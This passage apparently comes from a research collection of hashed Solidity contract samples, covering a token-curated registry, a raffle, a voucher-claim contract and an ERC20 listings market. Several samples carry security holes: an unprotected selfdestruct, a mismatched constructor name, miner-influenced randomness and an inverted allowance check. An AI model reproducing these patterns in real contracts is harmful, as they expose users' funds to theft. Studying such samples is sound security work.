        return bytes32(store.getAttribute(attrUUID(_voter, _pollID), "commitHash"));    
    } 
    function getNumTokens(address _voter, uint _pollID) constant public returns (uint numTokens) {
        return store.getAttribute(attrUUID(_voter, _pollID), "numTokens");
    }
    function getLastNode(address _voter) constant public returns (uint pollID) {
        return dllMap[_voter].getPrev(0);
    }
    function getLockedTokens(address _voter) constant public returns (uint numTokens) {
        return getNumTokens(_voter, getLastNode(_voter));
    }
    function getInsertPointForNumTokens(address _voter, uint _numTokens)
    constant public returns (uint prevNode) {
      uint nodeID = getLastNode(_voter);
      uint tokensInNode = getNumTokens(_voter, nodeID);
      while(tokensInNode != 0) {
        tokensInNode = getNumTokens(_voter, nodeID);
        if(tokensInNode < _numTokens) {
          return nodeID;
        }
        nodeID = dllMap[_voter].getPrev(nodeID);
      }
      return nodeID;
    }
    function isExpired(uint _terminationDate) constant public returns (bool expired) {
        return (block.timestamp > _terminationDate);
    }
    function attrUUID(address _user, uint _pollID) public pure returns (bytes32 UUID) {
        return keccak256(_user, _pollID);
    }
}
contract Parameterizer {
  event _ReparameterizationProposal(address proposer, string name, uint value, bytes32 propID);
  event _NewChallenge(address challenger, bytes32 propID, uint pollID);
  struct ParamProposal {
    uint appExpiry;
    uint challengeID;
    uint deposit;
    string name;
    address owner;
    uint processBy;
    uint value;
  }
  struct Challenge {
    uint rewardPool;        
    address challenger;     
    bool resolved;          
    uint stake;             
    uint winningTokens;     
    mapping(address => bool) tokenClaims;
  }
  mapping(bytes32 => uint) public params;
  mapping(uint => Challenge) public challenges;
  mapping(bytes32 => ParamProposal) public proposals; 
  EIP20 public token;
  PLCRVoting public voting;
  uint public PROCESSBY = 604800; 
  function Parameterizer( 
    address _tokenAddr,
    address _plcrAddr,
    uint _minDeposit,
    uint _pMinDeposit,
    uint _applyStageLen,
    uint _pApplyStageLen,
    uint _commitStageLen,
    uint _pCommitStageLen,
    uint _revealStageLen,
    uint _pRevealStageLen,
    uint _dispensationPct,
    uint _pDispensationPct,
    uint _voteQuorum,
    uint _pVoteQuorum
    ) public {
      token = EIP20(_tokenAddr);
      voting = PLCRVoting(_plcrAddr);
      set("minDeposit", _minDeposit);
      set("pMinDeposit", _pMinDeposit);
      set("applyStageLen", _applyStageLen);
      set("pApplyStageLen", _pApplyStageLen);
      set("commitStageLen", _commitStageLen);
      set("pCommitStageLen", _pCommitStageLen);
      set("revealStageLen", _revealStageLen);
      set("pRevealStageLen", _pRevealStageLen);
      set("dispensationPct", _dispensationPct);
      set("pDispensationPct", _pDispensationPct);
      set("voteQuorum", _voteQuorum);
      set("pVoteQuorum", _pVoteQuorum);
  }
  function proposeReparameterization(string _name, uint _value) public returns (bytes32) {
    uint deposit = get("pMinDeposit");
    bytes32 propID = keccak256(_name, _value);
    require(!propExists(propID)); 
    require(get(_name) != _value); 
    require(token.transferFrom(msg.sender, this, deposit)); 
    proposals[propID] = ParamProposal({
      appExpiry: now + get("pApplyStageLen"),
      challengeID: 0,
      deposit: deposit,
      name: _name,
      owner: msg.sender,
      processBy: now + get("pApplyStageLen") + get("pCommitStageLen") +
        get("pRevealStageLen") + PROCESSBY,
      value: _value
    });
    _ReparameterizationProposal(msg.sender, _name, _value, propID);
    return propID;
  }
  function challengeReparameterization(bytes32 _propID) public returns (uint challengeID) {
    ParamProposal memory prop = proposals[_propID];
    uint deposit = get("pMinDeposit");
    require(propExists(_propID) && prop.challengeID == 0); 
    require(token.transferFrom(msg.sender, this, deposit));
    uint pollID = voting.startPoll(
      get("pVoteQuorum"),
      get("pCommitStageLen"),
      get("pRevealStageLen")
    );
    challenges[pollID] = Challenge({
      challenger: msg.sender,
      rewardPool: ((100 - get("pDispensationPct")) * deposit) / 100, 
      stake: deposit,
      resolved: false,
      winningTokens: 0
    });
    proposals[_propID].challengeID = pollID;       
    _NewChallenge(msg.sender, _propID, pollID);
    return pollID;
  }
  function processProposal(bytes32 _propID) public {
    ParamProposal storage prop = proposals[_propID];
    if (canBeSet(_propID)) {
      set(prop.name, prop.value);
    } else if (challengeCanBeResolved(_propID)) {
      resolveChallenge(_propID);
    } else if (now > prop.processBy) {
      require(token.transfer(prop.owner, prop.deposit));
    } else {
      revert();
    }
    delete proposals[_propID];
  }
  function claimReward(uint _challengeID, uint _salt) public {
    require(challenges[_challengeID].tokenClaims[msg.sender] == false);
    require(challenges[_challengeID].resolved == true);
    uint voterTokens = voting.getNumPassingTokens(msg.sender, _challengeID, _salt);
    uint reward = voterReward(msg.sender, _challengeID, _salt);
    challenges[_challengeID].winningTokens -= voterTokens;
    challenges[_challengeID].rewardPool -= reward;
    require(token.transfer(msg.sender, reward));
    challenges[_challengeID].tokenClaims[msg.sender] = true;
  }
  function voterReward(address _voter, uint _challengeID, uint _salt)
  public view returns (uint) {
    uint winningTokens = challenges[_challengeID].winningTokens;
    uint rewardPool = challenges[_challengeID].rewardPool;
    uint voterTokens = voting.getNumPassingTokens(_voter, _challengeID, _salt);
    return (voterTokens * rewardPool) / winningTokens;
  }
  function canBeSet(bytes32 _propID) view public returns (bool) {
    ParamProposal memory prop = proposals[_propID];
    return (now > prop.appExpiry && now < prop.processBy && prop.challengeID == 0);
  }
  function propExists(bytes32 _propID) view public returns (bool) {
    return proposals[_propID].processBy > 0;
  }
  function challengeCanBeResolved(bytes32 _propID) view public returns (bool) {
    ParamProposal memory prop = proposals[_propID];
    Challenge memory challenge = challenges[prop.challengeID];
    return (prop.challengeID > 0 && challenge.resolved == false &&
            voting.pollEnded(prop.challengeID));
  }
  function challengeWinnerReward(uint _challengeID) public view returns (uint) {
    if(voting.getTotalNumberOfTokensForWinningOption(_challengeID) == 0) {
      return 2 * challenges[_challengeID].stake;
    }
    return (2 * challenges[_challengeID].stake) - challenges[_challengeID].rewardPool;
  }
  function get(string _name) public view returns (uint value) {
    return params[keccak256(_name)];
  }
  function resolveChallenge(bytes32 _propID) private {
    ParamProposal memory prop = proposals[_propID];
    Challenge storage challenge = challenges[prop.challengeID];
    uint reward = challengeWinnerReward(prop.challengeID);
    if (voting.isPassed(prop.challengeID)) { 
      if(prop.processBy > now) {
        set(prop.name, prop.value);
      }
      require(token.transfer(prop.owner, reward));
    } 
    else { 
      require(token.transfer(challenges[prop.challengeID].challenger, reward));
    }
    challenge.winningTokens =
      voting.getTotalNumberOfTokensForWinningOption(prop.challengeID);
    challenge.resolved = true;
  }
  function set(string _name, uint _value) private {
    params[keccak256(_name)] = _value;
  }
}
contract Registry {
    event _Application(bytes32 listingHash, uint deposit, string data);
    event _Challenge(bytes32 listingHash, uint deposit, uint pollID, string data);
    event _Deposit(bytes32 listingHash, uint added, uint newTotal);
    event _Withdrawal(bytes32 listingHash, uint withdrew, uint newTotal);
    event _NewListingWhitelisted(bytes32 listingHash);
    event _ApplicationRemoved(bytes32 listingHash);
    event _ListingRemoved(bytes32 listingHash);
    event _ChallengeFailed(uint challengeID);
    event _ChallengeSucceeded(uint challengeID);
    event _RewardClaimed(address voter, uint challengeID, uint reward);
    struct Listing {
        uint applicationExpiry; 
        bool whitelisted;       
        address owner;          
        uint unstakedDeposit;   
        uint challengeID;       
    }
    struct Challenge {
        uint rewardPool;        
        address challenger;     
        bool resolved;          
        uint stake;             
        uint totalTokens;       
        mapping(address => bool) tokenClaims; 
    }
    mapping(uint => Challenge) public challenges;
    mapping(bytes32 => Listing) public listings;
    EIP20 public token;
    PLCRVoting public voting;
    Parameterizer public parameterizer;
    string public version = '1';
    function Registry(
        address _tokenAddr,
        address _plcrAddr,
        address _paramsAddr
    ) public {
        token = EIP20(_tokenAddr);
        voting = PLCRVoting(_plcrAddr);
        parameterizer = Parameterizer(_paramsAddr);
    }
    function apply(bytes32 _listingHash, uint _amount, string _data) external {
        require(!isWhitelisted(_listingHash));
        require(!appWasMade(_listingHash));
        require(_amount >= parameterizer.get("minDeposit"));
        Listing storage listingHash = listings[_listingHash];
        listingHash.owner = msg.sender;
        require(token.transferFrom(listingHash.owner, this, _amount));
        listingHash.applicationExpiry = block.timestamp + parameterizer.get("applyStageLen");
        listingHash.unstakedDeposit = _amount;
        _Application(_listingHash, _amount, _data);
    }
    function deposit(bytes32 _listingHash, uint _amount) external {
        Listing storage listingHash = listings[_listingHash];
        require(listingHash.owner == msg.sender);
        require(token.transferFrom(msg.sender, this, _amount));
        listingHash.unstakedDeposit += _amount;
        _Deposit(_listingHash, _amount, listingHash.unstakedDeposit);
    }
    function withdraw(bytes32 _listingHash, uint _amount) external {
        Listing storage listingHash = listings[_listingHash];
        require(listingHash.owner == msg.sender);
        require(_amount <= listingHash.unstakedDeposit);
        require(listingHash.unstakedDeposit - _amount >= parameterizer.get("minDeposit"));
        require(token.transfer(msg.sender, _amount));
        listingHash.unstakedDeposit -= _amount;
        _Withdrawal(_listingHash, _amount, listingHash.unstakedDeposit);
    }
    function exit(bytes32 _listingHash) external {
        Listing storage listingHash = listings[_listingHash];
        require(msg.sender == listingHash.owner);
        require(isWhitelisted(_listingHash));
        require(listingHash.challengeID == 0 || challenges[listingHash.challengeID].resolved);
        resetListing(_listingHash);
    }
    function challenge(bytes32 _listingHash, string _data) external returns (uint challengeID) {
        bytes32 listingHashHash = _listingHash;
        Listing storage listingHash = listings[listingHashHash];
        uint deposit = parameterizer.get("minDeposit");
        require(appWasMade(_listingHash) || listingHash.whitelisted);
        require(listingHash.challengeID == 0 || challenges[listingHash.challengeID].resolved);
        if (listingHash.unstakedDeposit < deposit) {
            resetListing(_listingHash);
            return 0;
        }
        require(token.transferFrom(msg.sender, this, deposit));
        uint pollID = voting.startPoll(
            parameterizer.get("voteQuorum"),
            parameterizer.get("commitStageLen"),
            parameterizer.get("revealStageLen")
        );
        challenges[pollID] = Challenge({
            challenger: msg.sender,
            rewardPool: ((100 - parameterizer.get("dispensationPct")) * deposit) / 100,
            stake: deposit,
            resolved: false,
            totalTokens: 0
        });
        listings[listingHashHash].challengeID = pollID;
        listings[listingHashHash].unstakedDeposit -= deposit;
        _Challenge(_listingHash, deposit, pollID, _data);
        return pollID;
    }
    function updateStatus(bytes32 _listingHash) public {
        if (canBeWhitelisted(_listingHash)) {
          whitelistApplication(_listingHash);
          _NewListingWhitelisted(_listingHash);
        } else if (challengeCanBeResolved(_listingHash)) {
          resolveChallenge(_listingHash);
        } else {
          revert();
        }
    }
    function claimReward(uint _challengeID, uint _salt) public {
        require(challenges[_challengeID].tokenClaims[msg.sender] == false);
        require(challenges[_challengeID].resolved == true);
        uint voterTokens = voting.getNumPassingTokens(msg.sender, _challengeID, _salt);
        uint reward = voterReward(msg.sender, _challengeID, _salt);
        challenges[_challengeID].totalTokens -= voterTokens;
        challenges[_challengeID].rewardPool -= reward;
        require(token.transfer(msg.sender, reward));
        challenges[_challengeID].tokenClaims[msg.sender] = true;
        _RewardClaimed(msg.sender, _challengeID, reward);
    }
    function voterReward(address _voter, uint _challengeID, uint _salt)
    public view returns (uint) {
        uint totalTokens = challenges[_challengeID].totalTokens;
        uint rewardPool = challenges[_challengeID].rewardPool;
        uint voterTokens = voting.getNumPassingTokens(_voter, _challengeID, _salt);
        return (voterTokens * rewardPool) / totalTokens;
    }
    function canBeWhitelisted(bytes32 _listingHash) view public returns (bool) {
        bytes32 listingHashHash = _listingHash;
        uint challengeID = listings[listingHashHash].challengeID;
        if (
            appWasMade(_listingHash) &&
            listings[listingHashHash].applicationExpiry < now &&
            !isWhitelisted(_listingHash) &&
            (challengeID == 0 || challenges[challengeID].resolved == true)
        ) { return true; }
        return false;
    }
    function isWhitelisted(bytes32 _listingHash) view public returns (bool whitelisted) {
        return listings[_listingHash].whitelisted;
    }
    function appWasMade(bytes32 _listingHash) view public returns (bool exists) {
        return listings[_listingHash].applicationExpiry > 0;
    }
    function challengeExists(bytes32 _listingHash) view public returns (bool) {
        bytes32 listingHashHash = _listingHash;
        uint challengeID = listings[listingHashHash].challengeID;
        return (listings[listingHashHash].challengeID > 0 && !challenges[challengeID].resolved);
    }
    function challengeCanBeResolved(bytes32 _listingHash) view public returns (bool) {
        bytes32 listingHashHash = _listingHash;
        uint challengeID = listings[listingHashHash].challengeID;
        require(challengeExists(_listingHash));
        return voting.pollEnded(challengeID);
    }
    function determineReward(uint _challengeID) public view returns (uint) {
        require(!challenges[_challengeID].resolved && voting.pollEnded(_challengeID));
        if (voting.getTotalNumberOfTokensForWinningOption(_challengeID) == 0) {
            return 2 * challenges[_challengeID].stake;
        }
        return (2 * challenges[_challengeID].stake) - challenges[_challengeID].rewardPool;
    }
    function tokenClaims(uint _challengeID, address _voter) public view returns (bool) {
      return challenges[_challengeID].tokenClaims[_voter];
    }
    function resolveChallenge(bytes32 _listingHash) private {
        bytes32 listingHashHash = _listingHash;
        uint challengeID = listings[listingHashHash].challengeID;
        uint reward = determineReward(challengeID);
        bool wasWhitelisted = isWhitelisted(_listingHash);
        if (voting.isPassed(challengeID)) {
            whitelistApplication(_listingHash);
            listings[listingHashHash].unstakedDeposit += reward;
            _ChallengeFailed(challengeID);
            if (!wasWhitelisted) { _NewListingWhitelisted(_listingHash); }
        }
        else {
            resetListing(_listingHash);
            require(token.transfer(challenges[challengeID].challenger, reward));
            _ChallengeSucceeded(challengeID);
            if (wasWhitelisted) { _ListingRemoved(_listingHash); }
            else { _ApplicationRemoved(_listingHash); }
        }
        challenges[challengeID].resolved = true;
        challenges[challengeID].totalTokens =
            voting.getTotalNumberOfTokensForWinningOption(challengeID);
    }
    function whitelistApplication(bytes32 _listingHash) private {
        listings[_listingHash].whitelisted = true;
    }
    function resetListing(bytes32 _listingHash) private {
        bytes32 listingHashHash = _listingHash;
        Listing storage listingHash = listings[listingHashHash];
        if (listingHash.unstakedDeposit > 0)
            require(token.transfer(listingHash.owner, listingHash.unstakedDeposit));
        delete listings[listingHashHash];
    }
}
```

## RQ1_86e344166934

SHA-256 `f85fefc960f7ef5ea8f52634b3f9e4c41d7991345d8c5ab82d4316d5a1fd55d3`

```solidity
pragma solidity ^0.4.24;
contract EtherGame 
{
    uint[] a;
    function Test1(uint a) public constant returns(address)
    {
        return msg.sender;
    }
    function Test2(uint a) constant returns(address)
    {
        return msg.sender;
    }
    function Test3(uint b) public constant returns(uint)
    {
        return a.length;
    }
    function Test4(uint b) constant returns(uint)
    {
        return a.length;
    }
    function Test5(uint b) external constant returns(uint)
    {
        return a.length;
    }
    function Test6() constant returns(uint)
    {
        return a.length;
    }
    function Kill(uint a)
    {
        selfdestruct(msg.sender);
    }
}

```

## RQ1_2a3f29f582b8

SHA-256 `a198a551d6ea80743de507e73577d266da7802d4b85d7d39a958ec1df91471e1`

```solidity
pragma solidity ^0.4.24;
contract PPBC_Ether_Claim {
     address ppbc;
     mapping (bytes32 => uint256) valid_voucher_code; 
     mapping (bytes32 => bool) redeemed;  
     mapping (bytes32 => address) who_claimed; 
     mapping (uint256 => bytes32) claimers; 
     uint256 public num_claimed;            
     uint256 public total_claim_codes;
     bool public deposits_refunded;
     function PPBC_Ether_Claim(){
        ppbc = msg.sender;
        deposits_refunded = false;
        num_claimed = 0;
        valid_voucher_code[0x99fc71fa477d1d3e6b6c3ed2631188e045b7f575eac394e50d0d9f182d3b0145] = 110.12 ether; total_claim_codes++;
        valid_voucher_code[0x8b4f72e27b2a84a30fe20b0ee5647e3ca5156e1cb0d980c35c657aa859b03183] = 53.2535 ether; total_claim_codes++;
        valid_voucher_code[0xe7ac3e31f32c5e232eb08a8f978c7e4c4845c44eb9fa36e89b91fc15eedf8ffb] = 151 ether; total_claim_codes++;
        valid_voucher_code[0xc18494ff224d767c15c62993a1c28e5a1dc17d7c41abab515d4fcce2bd6f629d] = 63.22342 ether; total_claim_codes++;
        valid_voucher_code[0x5cdb60c9e999a510d191cf427c9995d6ad3120a6b44afcb922149d275afc8ec4] = 101 ether; total_claim_codes++;
        valid_voucher_code[0x5fb7aed108f910cc73b3e10ceb8c73f90f8d6eff61cda5f43d47f7bec9070af4] = 16.3 ether; total_claim_codes++;
        valid_voucher_code[0x571a888f66f4d74442733441d62a92284f1c11de57198decf9d4c244fb558f29] = 424 ether; total_claim_codes++;
        valid_voucher_code[0x7123fa994a2990c5231d35cb11901167704ab19617fcbc04b93c45cf88b30e94] = 36.6 ether; total_claim_codes++;
        valid_voucher_code[0xdac0e1457b4cf3e53e9952b1f8f3a68a0f288a7e6192314d5b19579a5266cce0] = 419.1 ether; total_claim_codes++;
        valid_voucher_code[0xf836a280ec6c519f6e95baec2caee1ba4e4d1347f81d4758421272b81c4a36cb] = 86.44 ether; total_claim_codes++;
        valid_voucher_code[0x5470e8b8b149aca84ee799f6fd1a6bf885267a1f7c88c372560b28180e2cf056] = 92 ether; total_claim_codes++;
        valid_voucher_code[0x7f52b6f587c87240d471d6fcda1bb3c10c004771c1572443134fd6756c001c9a] = 124.2 ether; total_claim_codes++;
        valid_voucher_code[0x5d435968b687edc305c3adc29523aba1128bd9acd2c40ae2c9835f2e268522e1] = 95.102 ether; total_claim_codes++;
     }
     function register_claim(string password) payable {
          if (msg.value != 50 ether || valid_voucher_code[sha3(password)] == 0) return; 
          if (redeemed[sha3(password)] || deposits_refunded ) throw; 
          num_claimed++;
          redeemed[sha3(password)] = true;
          who_claimed[sha3(password)] = msg.sender;
          valid_voucher_code[sha3(password)] += 50 ether;  
          claimers[num_claimed] = sha3(password);    
     }
     function refund_deposits(string password){ 
            if (deposits_refunded) throw; 
            if (valid_voucher_code[sha3(password)] == 0) throw; 
            if (num_claimed >= total_claim_codes || block.number >= 2850000 ){  
                for (uint256 index = 1; index <= num_claimed; index++){
                    bytes32 claimcode = claimers[index];
                    address receiver = who_claimed[claimcode];
                    if (!receiver.send(50 ether)) throw; 
                    valid_voucher_code[claimcode] -= 50 ether;  
                }
                deposits_refunded = true; 
            }
            else throw;
     }
     function refund_claims(string password){ 
            if (!deposits_refunded) throw; 
            if (valid_voucher_code[sha3(password)] == 0) throw; 
            for (uint256 index = 1; index <= num_claimed; index++){
                bytes32 claimcode = claimers[index];
                address receiver = who_claimed[claimcode];
                uint256 refund_amount = valid_voucher_code[claimcode];
                if (this.balance >= refund_amount){
                    if (!receiver.send(refund_amount)) throw; 
                    valid_voucher_code[claimcode] = 0;  
                }
            }
     }
     function end_redeem_period(){ 
            if (block.number >= 2900000 || num_claimed == 0) 
               selfdestruct(ppbc);
     }
     function check_redeemed(string password) returns (bool){
         if (valid_voucher_code[sha3(password)] == 0) 
              return true; 
         return redeemed[sha3(password)];
     }
     function () payable {} 
}

```

## RQ1_17542fe3fddc

SHA-256 `19f3ab8790c31efac7fc9c55877a7c87b0f216b20ab1b052ca3ab95e1dce07f3`

```solidity
pragma solidity ^0.4.16;
contract Ethraffle_v1b {
    struct Contestant {
        address addr;
        uint raffleId;
    }
    event RaffleResult(
        uint indexed raffleId,
        uint winningNumber,
        address winningAddress,
        address seed1,
        address seed2,
        uint seed3,
        bytes32 randHash
    );
    event TicketPurchase(
        uint indexed raffleId,
        address contestant,
        uint number
    );
    event TicketRefund(
        uint indexed raffleId,
        address contestant,
        uint number
    );
    uint public constant prize = 2.5 ether;
    uint public constant fee = 0.03 ether;
    uint public constant totalTickets = 50;
    uint public constant pricePerTicket = (prize + fee) / totalTickets; 
    address feeAddress;
    bool public paused = false;
    uint public raffleId = 1;
    uint nextTicket = 0;
    mapping (uint => Contestant) contestants;
    uint[] gaps;
    function Ethraffle() public {
        feeAddress = msg.sender;
    }
    function () payable public {
        buyTickets();
    }
    function buyTickets() payable public {
        if (paused) {
            msg.sender.transfer(msg.value);
            return;
        }
        uint moneySent = msg.value;
        while (moneySent >= pricePerTicket && nextTicket < totalTickets) {
            uint currTicket = 0;
            if (gaps.length > 0) {
                currTicket = gaps[gaps.length-1];
                gaps.length--;
            } else {
                currTicket = nextTicket++;
            }
            contestants[currTicket] = Contestant(msg.sender, raffleId);
            TicketPurchase(raffleId, msg.sender, currTicket);
            moneySent -= pricePerTicket;
        }
        if (nextTicket == totalTickets) {
            chooseWinner();
        }
        if (moneySent > 0) {
            msg.sender.transfer(moneySent);
        }
    }
    function chooseWinner() private {
        address seed1 = contestants[uint(block.coinbase) % totalTickets].addr;
        address seed2 = contestants[uint(msg.sender) % totalTickets].addr;
        uint seed3 = block.difficulty;
        bytes32 randHash = keccak256(seed1, seed2, seed3);
        uint winningNumber = uint(randHash) % totalTickets;
        address winningAddress = contestants[winningNumber].addr;
        RaffleResult(raffleId, winningNumber, winningAddress, seed1, seed2, seed3, randHash);
        raffleId++;
        nextTicket = 0;
        winningAddress.transfer(prize);
        feeAddress.transfer(fee);
    }
    function getRefund() public {
        uint refund = 0;
        for (uint i = 0; i < totalTickets; i++) {
            if (msg.sender == contestants[i].addr && raffleId == contestants[i].raffleId) {
                refund += pricePerTicket;
                contestants[i] = Contestant(address(0), 0);
                gaps.push(i);
                TicketRefund(raffleId, msg.sender, i);
            }
        }
        if (refund > 0) {
            msg.sender.transfer(refund);
        }
    }
    function endRaffle() public {
        if (msg.sender == feeAddress) {
            paused = true;
            for (uint i = 0; i < totalTickets; i++) {
                if (raffleId == contestants[i].raffleId) {
                    TicketRefund(raffleId, contestants[i].addr, i);
                    contestants[i].addr.transfer(pricePerTicket);
                }
            }
            RaffleResult(raffleId, totalTickets, address(0), address(0), address(0), 0, 0);
            raffleId++;
            nextTicket = 0;
            gaps.length = 0;
        }
    }
    function togglePause() public {
        if (msg.sender == feeAddress) {
            paused = !paused;
        }
    }
    function kill() public {
        if (msg.sender == feeAddress) {
            selfdestruct(feeAddress);
        }
    }
}
```

## RQ1_8672b1ce272c

SHA-256 `84c02e19ebd446a514b4ec48b25c678ebb0ef2f068b54e4baec11ca7dc33b06c`

```solidity
pragma solidity ^0.4.18;
contract Ownable {
  address public owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  function Ownable() public {
    owner = msg.sender;
  }
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }
}
contract ERC20Basic {
  uint256 public totalSupply;
  function balanceOf(address who) public view returns (uint256);
  function transfer(address to, uint256 value) public returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
}
contract ERC20 is ERC20Basic {
  function allowance(address owner, address spender) public view returns (uint256);
  function transferFrom(address from, address to, uint256 value) public returns (bool);
  function approve(address spender, uint256 value) public returns (bool);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract ListingsERC20 is Ownable {
      using SafeMath for uint256;
    struct Listing {
        address seller;
        address tokenContractAddress;
        uint256 price;
        uint256 allowance;
        uint256 dateStarts;
        uint256 dateEnds;
    }
    event ListingCreated(bytes32 indexed listingId, address tokenContractAddress, uint256 price, uint256 allowance, uint256 dateStarts, uint256 dateEnds, address indexed seller);
    event ListingCancelled(bytes32 indexed listingId, uint256 dateCancelled);
    event ListingBought(bytes32 indexed listingId, address tokenContractAddress, uint256 price, uint256 amount, uint256 dateBought, address buyer);
    string constant public VERSION = "1.0.1";
    uint16 constant public GAS_LIMIT = 4999;
    uint256 public ownerPercentage;
    mapping (bytes32 => Listing) public listings;
    mapping (bytes32 => uint256) public sold;
    function ListingsERC20(uint256 percentage) public {
        ownerPercentage = percentage;
    }
    function updateOwnerPercentage(uint256 percentage) external onlyOwner {
        ownerPercentage = percentage;
    }
    function withdrawBalance() onlyOwner external {
        assert(owner.send(this.balance));
    }
    function approveToken(address token, uint256 amount) onlyOwner external {
        assert(ERC20(token).approve(owner, amount));
    }
    function() external payable { }
    function getHash(address tokenContractAddress, uint256 price, uint256 allowance, uint256 dateEnds, uint256 salt) external view returns (bytes32) {
        return getHashInternal(tokenContractAddress, price, allowance, dateEnds, salt);
    }
    function getHashInternal(address tokenContractAddress, uint256 price, uint256 allowance, uint256 dateEnds, uint256 salt) internal view returns (bytes32) {
        return keccak256(msg.sender, tokenContractAddress, price, allowance, dateEnds, salt);
    }
    function getBalance(address tokenContract, address seller) internal constant returns (uint256) {
        return ERC20(tokenContract).balanceOf.gas(GAS_LIMIT)(seller);
    }
    function getAllowance(address tokenContract, address seller, address listingContract) internal constant returns (uint256) {
        return ERC20(tokenContract).allowance.gas(GAS_LIMIT)(seller, listingContract);
    }
    function createListing(address tokenContractAddress, uint256 price, uint256 allowance, uint256 dateEnds, uint256 salt) external {
        require(price > 0);
        require(allowance > 0);
        require(dateEnds > 0);
        require(getBalance(tokenContractAddress, msg.sender) >= allowance);
        bytes32 listingId = getHashInternal(tokenContractAddress, price, allowance, dateEnds, salt);
        Listing memory listing = Listing(msg.sender, tokenContractAddress, price, allowance, now, dateEnds);
        listings[listingId] = listing;
        ListingCreated(listingId, tokenContractAddress, price, allowance, now, dateEnds, msg.sender);
    }
    function cancelListing(bytes32 listingId) external {
        Listing storage listing = listings[listingId];
        require(msg.sender == listing.seller);
        delete listings[listingId];
        ListingCancelled(listingId, now);
    }
    function buyListing(bytes32 listingId, uint256 amount) external payable {
        Listing storage listing = listings[listingId];
        address seller = listing.seller;
        address contractAddress = listing.tokenContractAddress;
        uint256 price = listing.price;
        uint256 sale = price.mul(amount);
        uint256 allowance = listing.allowance;
        require(now <= listing.dateEnds);
        require(allowance - sold[listingId] >= amount);
        require(allowance - amount >= 0);
        require(getBalance(contractAddress, seller) >= allowance);
        require(getAllowance(contractAddress, seller, this) <= allowance);
        require(msg.value == sale);
        ERC20 tokenContract = ERC20(contractAddress);
        require(tokenContract.transferFrom(seller, msg.sender, amount));
        seller.transfer(sale - (sale.mul(ownerPercentage).div(10000)));
        sold[listingId] = allowance.sub(amount);
        ListingBought(listingId, contractAddress, price, amount, now, msg.sender);
    }
}
```

## RQ1_87301d949ea4

SHA-256 `d5098ec80647ae8704e07abec8bff414784f3cd4ecae2dfa49310242fa648838`

```solidity
pragma solidity ^0.4.18;
contract Ownable {
  address public owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  function Ownable() public {
    owner = msg.sender;
  }
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }
}
contract ERC20Basic {
  uint256 public totalSupply;
  function balanceOf(address who) public view returns (uint256);
  function transfer(address to, uint256 value) public returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
}
contract ERC20 is ERC20Basic {
  function allowance(address owner, address spender) public view returns (uint256);
  function transferFrom(address from, address to, uint256 value) public returns (bool);
  function approve(address spender, uint256 value) public returns (bool);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract ListingsERC20 is Ownable {
      using SafeMath for uint256;
    struct Listing {
        address seller;
        address tokenContractAddress;
        uint256 price;
        uint256 allowance;
        uint256 dateStarts;
        uint256 dateEnds;
    }
    event ListingCreated(bytes32 indexed listingId, address tokenContractAddress, uint256 price, uint256 allowance, uint256 dateStarts, uint256 dateEnds, address indexed seller);
    event ListingCancelled(bytes32 indexed listingId, uint256 dateCancelled);
    event ListingBought(bytes32 indexed listingId, address tokenContractAddress, uint256 price, uint256 amount, uint256 dateBought, address buyer);
    string constant public VERSION = "1.0.1";
    uint16 constant public GAS_LIMIT = 4999;
    uint256 public ownerPercentage;
    mapping (bytes32 => Listing) public listings;
    mapping (bytes32 => uint256) public sold;
    function ListingsERC20(uint256 percentage) public {
        ownerPercentage = percentage;
    }
    function updateOwnerPercentage(uint256 percentage) external onlyOwner {
        ownerPercentage = percentage;
    }
    function withdrawBalance() onlyOwner external {
        assert(owner.send(this.balance));
    }
    function approveToken(address token, uint256 amount) onlyOwner external {
        assert(ERC20(token).approve(owner, amount));
    }
    function() external payable { }
    function getHash(address tokenContractAddress, uint256 price, uint256 allowance, uint256 dateEnds, uint256 salt) external view returns (bytes32) {
        return getHashInternal(tokenContractAddress, price, allowance, dateEnds, salt);
    }
    function getHashInternal(address tokenContractAddress, uint256 price, uint256 allowance, uint256 dateEnds, uint256 salt) internal view returns (bytes32) {
        return keccak256(msg.sender, tokenContractAddress, price, allowance, dateEnds, salt);
    }
    function getBalance(address tokenContract, address seller) internal constant returns (uint256) {
        return ERC20(tokenContract).balanceOf.gas(GAS_LIMIT)(seller);
    }
    function getAllowance(address tokenContract, address seller, address listingContract) internal constant returns (uint256) {
        return ERC20(tokenContract).allowance.gas(GAS_LIMIT)(seller, listingContract);
    }
    function createListing(address tokenContractAddress, uint256 price, uint256 allowance, uint256 dateEnds, uint256 salt) external {
        require(price > 0);
        require(allowance > 0);
        require(dateEnds > 0);
        require(getBalance(tokenContractAddress, msg.sender) >= allowance);
        bytes32 listingId = getHashInternal(tokenContractAddress, price, allowance, dateEnds, salt);
        Listing memory listing = Listing(msg.sender, tokenContractAddress, price, allowance, now, dateEnds);
        listings[listingId] = listing;
